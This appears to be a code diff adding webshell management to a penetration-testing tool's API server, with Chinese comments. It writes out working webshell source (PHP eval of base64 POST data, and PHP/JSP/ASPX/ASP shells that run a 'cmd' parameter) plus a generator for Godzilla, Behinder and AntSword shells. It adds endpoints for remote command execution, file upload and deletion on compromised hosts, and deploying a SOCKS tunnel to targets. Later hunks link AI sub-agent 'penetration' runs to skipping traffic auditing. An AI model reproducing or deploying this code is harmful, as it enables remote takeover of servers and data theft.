+      headers: outLines,
+      body: decodeBody(r.body, (r.headers['content-encoding'] as string) || undefined),
+    }
     return resp
   }
 
@@ -1229,6 +1561,288 @@ export class ApiServer {
           } else { this.json(res, 405, { error: 'method not allowed' }) }
           break
         }
+        // ---------------- WebShell 管理（CRUD + 命令执行 + 存活探测；经内置代理发出，流量进流量面板） ----------------
+        case '/api/webshells': {
+          if (req.method === 'GET') {
+            this.json(res, 200, { items: this.webshells.map(({ password, key, ...meta }) => ({ ...meta, password: password ? '***' : '', key: key ? '***' : '' })) })
+          } else if (req.method === 'POST') {
+            const b = JSON.parse(await this.readBody(req)) as Partial<{ type: string; script: string; url: string; password: string; key: string; cryption: string; payload: string; encoding: string; headers: string; reqLeft: string; reqRight: string; connTimeout: number; readTimeout: number; remark: string }>
+            if (!b.url) throw new Error('url 缺失')
+            const w = { id: ++this.wsSeq, type: b.type || 'custom', script: b.script || 'php', url: b.url, password: b.password || '', key: b.key || '', status: 'unknown', ts: Date.now(), cryption: b.cryption || '', payload: b.payload || '', encoding: b.encoding || 'UTF-8', headers: b.headers || '', reqLeft: b.reqLeft || '', reqRight: b.reqRight || '', connTimeout: b.connTimeout || 3000, readTimeout: b.readTimeout || 60000, remark: b.remark || '' }
+            this.webshells.push(w)
+            this.saveWebshells()
+            this.json(res, 200, { ok: true, id: w.id })
+          } else { this.json(res, 405, { error: 'method not allowed' }) }
+          break
+        }
+        case '/api/webshells/detail': {
+          const id = Number(url.searchParams.get('id')) || 0
+          const w = this.webshells.find((x) => x.id === id)
+          if (!w) { this.json(res, 404, { error: 'not found' }); break }
+          if (req.method === 'GET') this.json(res, 200, w)
+          else if (req.method === 'PUT') {
+            const b = JSON.parse(await this.readBody(req)) as Partial<{ type: string; script: string; url: string; password: string; key: string; cryption: string; payload: string; encoding: string; headers: string; reqLeft: string; reqRight: string; connTimeout: number; readTimeout: number; remark: string }>
+            if (b.type !== undefined) w.type = b.type
+            if (b.script !== undefined) w.script = b.script
+            if (b.url !== undefined) w.url = b.url
+            if (b.password !== undefined) w.password = b.password
+            if (b.key !== undefined) w.key = b.key
+            if (b.cryption !== undefined) w.cryption = b.cryption
+            if (b.payload !== undefined) w.payload = b.payload
+            if (b.encoding !== undefined) w.encoding = b.encoding
+            if (b.headers !== undefined) w.headers = b.headers
+            if (b.connTimeout !== undefined) w.connTimeout = b.connTimeout
+            if (b.readTimeout !== undefined) w.readTimeout = b.readTimeout
+            if (b.remark !== undefined) w.remark = b.remark
+            if (b.reqLeft !== undefined) w.reqLeft = b.reqLeft
+            if (b.reqRight !== undefined) w.reqRight = b.reqRight
+            if (b.timeout !== undefined) w.timeout = b.timeout
+            this.saveWebshells()
+            this.json(res, 200, { ok: true })
+          } else if (req.method === 'DELETE') {
+            this.webshells = this.webshells.filter((x) => x.id !== id)
+            this.saveWebshells()
+            this.json(res, 200, { ok: true })
+          } else { this.json(res, 405, { error: 'method not allowed' }) }
+          break
+        }
+        case '/api/webshells/ping': {
+          const b = JSON.parse(await this.readBody(req)) as { id: number }
+          const w = this.webshells.find((x) => x.id === b.id)
+          if (!w) throw new Error('webshell 不存在')
+          try {
+            const r = await this.wsRequest(w, 'GET', w.url, undefined)
+            w.status = r.code >= 200 && r.code < 400 ? 'alive' : 'dead'
+            this.saveWebshells()
+            this.json(res, 200, { alive: w.status === 'alive', code: r.code })
+          } catch (e) {
+            w.status = 'dead'
+            this.saveWebshells()
+            this.json(res, 200, { alive: false, error: (e as Error).message })
+          }
+          break
+        }
+        case '/api/webshells/alive': {
+          const b = JSON.parse(await this.readBody(req)) as { id: number }
+          const w = this.webshells.find((x) => x.id === b.id)
+          if (!w) throw new Error('webshell 不存在')
+          const r = await this.wsAliveShell(w)
+          w.status = r.alive ? 'alive' : 'dead'
+          this.saveWebshells()
+          this.json(res, 200, { alive: r.alive, detail: r.detail || '', error: r.error || '' })
+          break
+        }
+        case '/api/webshells/alive_all': {
+          // 测试所有 WebShell 连接（逐个存活校验），更新各自 status，返回汇总
+          const results: { id: number; url: string; type: string; script: string; alive: boolean; detail: string; error: string }[] = []
+          for (const w of this.webshells) {
+            const r = await this.wsAliveShell(w)
+            w.status = r.alive ? 'alive' : 'dead'
+            results.push({ id: w.id, url: w.url, type: w.type, script: w.script, alive: r.alive, detail: r.detail || '', error: r.error || '' })
+          }
+          this.saveWebshells()
+          this.json(res, 200, { results })
+          break
+        }
+        case '/api/webshells/fileop': {
+          // 文件操作（哥斯拉调 payload 方法）：action=list(列目录)/delete/read/write
+          const b = JSON.parse(await this.readBody(req)) as { id: number; action: string; dir?: string; file?: string; content?: string }
+          const w = this.webshells.find((x) => x.id === b.id)
+          if (!w) throw new Error('webshell 不存在')
+          let pms: Record<string, string | Buffer>
+          if (b.action === 'list') pms = { methodName: 'getFile', dirName: b.dir || '/' }
+          else if (b.action === 'delete') pms = { methodName: 'deleteFile', fileName: b.file || '' }
+          else if (b.action === 'read') pms = { methodName: w.script === 'php' ? 'readFileContent' : 'readFile', fileName: b.file || '' }
+          else if (b.action === 'write') pms = { methodName: 'uploadFile', fileName: b.file || '', fileValue: Buffer.from(b.content || '', 'base64') }
+          else throw new Error('未知操作')
+          const buf = await this.wsFileOp(w, pms)
+          // 读取返回 base64（二进制安全）；其他返回文本
+          if (b.action === 'read') this.json(res, 200, { output: buf.toString('base64') })
+          else this.json(res, 200, { output: buf.toString(w.encoding || 'utf8') })
+          break
+        }
+        case '/api/webshells/suo5': {
+          // Suo5 正向代理：部署服务端到目标 + 启动本地 SOCKS5 隧道
+          const b = JSON.parse(await this.readBody(req)) as { action: 'start' | 'stop' | 'status'; id?: number; type?: string; url?: string; port?: number; dir?: string; name?: string }
+          if (b.action === 'status') {
+            this.json(res, 200, { running: !!this.suo5Proc, port: this.suo5Proc?.port || 0, url: this.suo5Proc?.url || '' })
+            break
+          }
+          if (b.action === 'stop') {
+            if (this.suo5Proc) { try { this.suo5Proc.proc.kill() } catch { /* */ } this.suo5Proc = null }
+            this.json(res, 200, { ok: true })
+            break
+          }
+          // start
+          const w = this.webshells.find((x) => x.id === b.id)
+          if (!w) throw new Error('webshell 不存在')
+          if (!b.url) throw new Error('目标 URL 缺失')
+          // 类型按 Webshell 脚本自动判断（未显式指定时）
+          const autoType = w.script === 'jsp' || w.script === 'jspx' ? 'jsp' : (w.script === 'aspx' || w.script === 'asp') ? 'aspx' : 'php'
+          const ext = b.type === 'jsp' ? 'jsp' : b.type === 'aspx' ? 'aspx' : (b.type || autoType) === 'jsp' ? 'jsp' : (b.type || autoType) === 'aspx' ? 'aspx' : 'php'
+          const fn = (b.name || 'suo5').replace(/[\\/]/g, '') + '.' + ext
+          const scriptPath = join(process.cwd(), 'tools', 'suo5', fn)
+          if (!existsSync(scriptPath)) throw new Error('服务端脚本缺失: ' + scriptPath)
+          const script = readFileSync(scriptPath)
+          const dir = (b.dir || '/tmp').replace(/\/+$/, '')
+          const target = dir + '/' + fn
+          // 部署服务端到目标
+          if (w.type === 'godzilla') {
+            await this.wsFileOp(w, { methodName: 'uploadFile', fileName: target, fileValue: script })
+          } else {
+            const b64 = script.toString('base64')
+            await this.wsExecShell(w, `echo ${b64} | base64 -d > ${JSON.stringify(target)}`)
+          }
+          // 启动本地隧道（直连目标；若目标需经代理，可自行配置 suo5 --proxy）
+          const port = b.port || 1080
+          const suo5Dir = join(process.cwd(), 'tools', 'suo5')
+          const suo5Bin = join(suo5Dir, 'suo5.exe')
+          if (this.suo5Proc) { try { this.suo5Proc.proc.kill() } catch { /* */ } }
+          this.suo5Proc = { proc: spawn(suo5Bin, ['-t', b.url, '-l', '127.0.0.1:' + port], { detached: true, cwd: suo5Dir, stdio: 'ignore' }), port, url: b.url }
+          this.json(res, 200, { ok: true, path: target, port })
+          break
+        }
+        case '/api/webshells/test': {
+          // 添加弹窗"测试连接"：用临时参数走存活校验（不保存）
+          const b = JSON.parse(await this.readBody(req)) as { type: string; script: string; url: string; password: string; key: string; cryption: string; payload: string; encoding: string; headers: string; readTimeout: number }
+          if (!b.url) throw new Error('url 缺失')
+          // 测试前清除该 URL 的会话 cookie（避免复用之前失败/污染/其他配置的 session，保证握手干净）
+          this.wsCookies.delete(b.url)
+          const w = {
+            id: 0, type: (b.type || 'custom').toLowerCase(), script: (b.script || 'php').toLowerCase(),
+            url: b.url, password: b.password || '', key: b.key || '', cryption: b.cryption || '', payload: b.payload || '',
+            encoding: b.encoding || 'UTF-8', headers: b.headers || '', readTimeout: b.readTimeout || 60000,
+          }
+          const r = await this.wsAliveShell(w)
+          this.json(res, 200, { alive: r.alive, detail: r.detail || '', error: r.error || '' })
+          break
+        }
+        case '/api/webshells/exec': {
+          const b = JSON.parse(await this.readBody(req)) as { id: number; command: string }
+          const w = this.webshells.find((x) => x.id === b.id)
+          if (!w) throw new Error('webshell 不存在')
+          if (!b.command) throw new Error('command 缺失')
+          try {
+            const out = await this.wsExecShell(w, b.command)
+            this.json(res, 200, { ok: true, output: out })
+          } catch (e) {
+            this.json(res, 200, { ok: false, error: (e as Error).message })
+          }
+          break
+        }
+        // ---------------- WebShell 生成（参考各工具原版：哥斯拉=Payload+加密；冰蝎=AES密钥模板；蚁剑=一句话；自定义=脚本） ----------------
+        case '/api/webshells/generate': {
+          const b = JSON.parse(await this.readBody(req)) as { type: string; payload: string; script: string; cryption: string; password: string; key: string }
+          const type = (b.type || 'godzilla').toLowerCase()
+          const pass = (b.password || 'pass').trim()
+          const key = (b.key || '3c6e0b8a9c15224a').trim()
+          const payload = b.payload || 'PhpDynamicPayload'
+          const script = (b.script || 'php').toLowerCase()
+          const cryption = (b.cryption || '').toLowerCase()
+          const md5Key = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
+          const md5Pass = crypto.createHash('md5').update(pass, 'utf8').digest('hex').slice(0, 16)
+          const isRaw = cryption.includes('raw')
+          const isEval = cryption.includes('eval')
+          // 读取模板
+          const readT = (dir: string, name: string): string => {
+            const p = join(process.cwd(), 'assets', 'payloads', dir, name)
+            return existsSync(p) ? readFileSync(p, 'utf8') : ''
+          }
+          const toUnicode = (s: string): string => {
+            let out = ''
+            for (const ch of s) out += '\\u' + ch.charCodeAt(0).toString(16).padStart(4, '0')
+            return out
+          }
+          let code = ''
+          let mode = ''
+          let outScript = script
+          // ================= 哥斯拉（Payload 决定脚本+加密） =================
+          if (type === 'godzilla') {
+            const metaOf = (p: string) => p === 'PhpDynamicPayload' ? 'php' : p === 'JavaDynamicPayload' ? 'jsp' : p === 'CShapDynamicPayload' ? 'aspx' : p === 'AspDynamicPayload' ? 'asp' : ''
+            outScript = metaOf(payload)
+            if (!outScript) throw new Error(`未知 payload: ${payload}`)
+            if (outScript === 'php') {
+              const tmplName = isRaw ? 'raw.bin' : isEval ? 'eval.bin' : 'base64.bin'
+              let tmpl = readT('php', tmplName)
+              if (!tmpl) throw new Error('PHP 模板缺失')
+              code = tmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
+              mode = isRaw ? 'XOR RAW' : isEval ? 'EVAL XOR BASE64' : 'XOR BASE64'
+            } else if (outScript === 'jsp') {
+              // 原版 JavaAes：raw/base64 模板 + shell.jsp，明文替换（与原版 GUI 完全一致，无 unicode 转义）
+              const gTmpl = readT('java', (isRaw ? 'raw' : 'base64') + 'GlobalCode.bin')
+              const cTmpl = readT('java', (isRaw ? 'raw' : 'base64') + 'Code.bin')
+              const shellTmpl = readT('java', 'shell.jsp')
+              if (!gTmpl || !cTmpl || !shellTmpl) throw new Error('JSP 模板缺失')
+              const globalCode = gTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
+              const codePart = cTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
+              code = shellTmpl.replace(/\{globalCode\}/g, globalCode).replace(/\{code\}/g, codePart)
+              mode = isRaw ? 'JAVA AES RAW' : 'JAVA AES BASE64'
+            } else if (outScript === 'aspx') {
+              const cTmpl = isRaw ? readT('cshap', 'raw.bin') : readT('cshap', 'base64.bin')
+              const shellTmpl = readT('cshap', 'shell.aspx')
+              if (!cTmpl || !shellTmpl) throw new Error('ASPX 模板缺失')
+              const codePart = cTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
+              code = shellTmpl.replace(/\{code\}/g, codePart)
+              mode = isRaw ? 'CSHAP AES RAW' : 'CSHAP AES BASE64'
+            } else if (outScript === 'asp') {
+              let tmpl = ''
+              if (isEval) tmpl = readT('asp', 'AspEvalBase64.bin')
+              else if (isRaw) tmpl = readT('asp', 'AspXorRaw.bin')
+              else tmpl = readT('asp', 'AspXorBae64.bin')
+              if (!tmpl) throw new Error('ASP 模板缺失')
+              code = tmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
+              mode = isRaw ? 'ASP XOR RAW' : isEval ? 'ASP EVAL BASE64' : 'ASP XOR BASE64'
+            }
+          }
+          // ================= 冰蝎（AES 密钥=md5密码前16，服务端模板替换 key） =================
+          else if (type === 'behinder') {
+            outScript = script
+            const isXor = cryption.includes('xor')
+            if (isXor && script !== 'php') throw new Error('冰蝎 XOR 加密仅支持 PHP')
+            const tmplMap: Record<string, string> = {
+              php: isXor ? 'shell_xor.php' : 'shell.php', jsp: 'shell_java9.jsp', jspx: 'shell_uni.jsp', aspx: 'shell.aspx', asp: 'shell.asp',
+            }
+            const fname = tmplMap[script]
+            if (!fname) throw new Error(`冰蝎暂不支持脚本 ${script}`)
+            const tmpl = readT('behinder', fname)
+            if (!tmpl) throw new Error(`冰蝎模板缺失: ${fname}`)
+            // 冰蝎服务端 key = md5(密码)前16（模板默认 e45e329feb5d925b=md5('rebeyond')）
+            code = tmpl.replace(/e45e329feb5d925b/g, md5Pass)
+            mode = isXor ? `XOR（密钥=md5(密码)前16=${md5Pass}）` : `AES（密钥=md5(密码)前16=${md5Pass}）`
+          }
+          // ================= 蚁剑（一句话木马，密码为连接参数） =================
+          else if (type === 'antsword') {
+            outScript = script
+            const tmplMap: Record<string, string> = {
+              php: 'shell.php', jsp: 'shell.jsp', aspx: 'shell.aspx', asp: 'shell.asp',
+            }
+            const fname = tmplMap[script]
+            if (!fname) throw new Error(`蚁剑暂不支持脚本 ${script}`)
+            const tmpl = readT('antsword', fname)
+            if (!tmpl) throw new Error(`蚁剑模板缺失: ${fname}`)
+            // PHP 模板在 PHP8 下字符串函数名失效 → 用标准一句话（连接协议兼容：?id + shell=base64）
+            if (script === 'php') {
+              code = `<?php @eval(base64_decode($_POST["shell"]));?>`
+            } else {
+              code = tmpl
+            }
+            mode = `一句话木马 · 密码 ${pass}`
+          }
+          // ================= 自定义（基础一句话，GET ?pwd=<pass>&cmd= 参数，密码参与校验） =================
+          else if (type === 'custom') {
+            outScript = script
+            if (script === 'php') code = `<?php if(@$_GET["pwd"]=="${pass}")@system($_GET["cmd"]);?>`
+            else if (script === 'jsp') code = `<%if("${pass}".equals(request.getParameter("pwd"))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a;while((a=in.read())!=-1){out.print((char)a);}}%>`
+            else if (script === 'aspx') code = `<%@ Page Language="C#"%><%try{if(Request["pwd"]=="${pass}"){System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());}}catch{}%>`
+            else if (script === 'asp') code = `<%if request("pwd")="${pass}" then execute request("cmd")%>`
+            else throw new Error(`自定义暂不支持脚本 ${script}`)
+            mode = '自定义 · GET pwd+cmd 认证'
+          } else {
+            throw new Error(`未知类型: ${type}`)
+          }
+          this.json(res, 200, { ok: true, code, script: outScript, payload, note: `${type === 'godzilla' ? payload + ' · ' : ''}${mode}` })
+          break
+        }
         // ---------------- Intercept（请求拦截） ----------------
         case '/api/intercept/state': {
           if (req.method === 'PUT') {
@@ -1339,7 +1953,10 @@ export class ApiServer {
           // 记录渗透目标（取消时写入全局情报：同 API 状态可见）+ 进行中 key（防并发双渗透）
           const pm2 = (body.advice || '').match(/可进行\s*(.+?)\s*渗透/)?.[1] || ''
           if (penKey) this.penetratingKeys.add(penKey)
-          if (targetKey) this.penetrateTargets.set(slot, `${targetKey} ${pm2}`)
+          if (targetKey) {
+            this.penetrateTargets.set(slot, `${targetKey} ${pm2}`)
+            this.engine.setPenetrateTarget(targetKey)  // 代理层标记渗透目标 → 命中流量 self 跳过审计
+          }
           // 进行中工作共享：持久情报标记"正在渗透 X"（其他子 Agent 可见，避免重复建议/重复盯同一目标；完成/取消后移除）
           const tkHost = targetKey ? targetKey.split(':')[0] : ''
           const tkPath = targetKey ? targetKey.replace(/^[^/]+/, '') : ''
@@ -1354,6 +1971,7 @@ export class ApiServer {
           const reply = await this.runViaGateway(task, sess, (abort) => { this.penetrateChildren.set(slot, abort) })  // 渗透经本地 gateway 执行（取消 = WebSocket abort，参考 hermes-studio chat-run）
           this.penetrateChildren.delete(slot)
           this.penetrateTargets.delete(slot)  // 渗透正常完成：清除目标记录（取消记录只由 cancel 路径写入全局情报）
+          if (targetKey) this.engine.clearPenetrateTarget(targetKey)  // 同步清除代理层渗透目标标记
           // 子 Agent 执行时判定"该目标API渗透方式已进行过 不再重复渗透"（渗透前查重 miss、但子 Agent 依据【全局情报】识别出已渗透过）：
           // 视为自动取消——不写漏洞库、释放槽位会话（子 Agent 继续流量分析）、SSE 通知前端移除后台任务条
           if (reply.includes('该目标API渗透方式已进行过')) {
@@ -1405,6 +2023,7 @@ export class ApiServer {
           } finally {
             this.penetrating = false  // 结束渗透窗口（无论成败都恢复审计）
             if (penKey) this.penetratingKeys.delete(penKey)  // 释放进行中标记（防并发双渗透）
+            if (targetKey) this.engine.clearPenetrateTarget(targetKey)  // 同步清除代理层渗透目标标记（成功路径已清，此处兜底）
             // 兜底移除"正在渗透"digest 条目（成果/跳过分支已移；失败/无成果时此处兜底）
             const fkHost = targetKey ? targetKey.split(':')[0] : ''
             const fkPath = targetKey ? targetKey.replace(/^[^/]+/, '') : ''
@@ -1453,6 +2072,7 @@ export class ApiServer {
           }
           this.pendingAdviceSlots.delete(slot)  // 取消卡片/任务 → 恢复该槽流量分析
           this.penetrating = false  // 取消即恢复流量审计（防 kill 后 close 未触发的极端情况）
+          this.engine.clearAllPenetrateTargets()  // 取消：清除代理层所有渗透目标标记
           this.analyzeSlots[slot >= 0 && slot < ApiServer.MAX_PARALLEL ? slot : 0] = ''  // 释放槽位会话：下次分析新建干净会话，继续流量分析工作
           this.json(res, 200, { ok: true })
           break
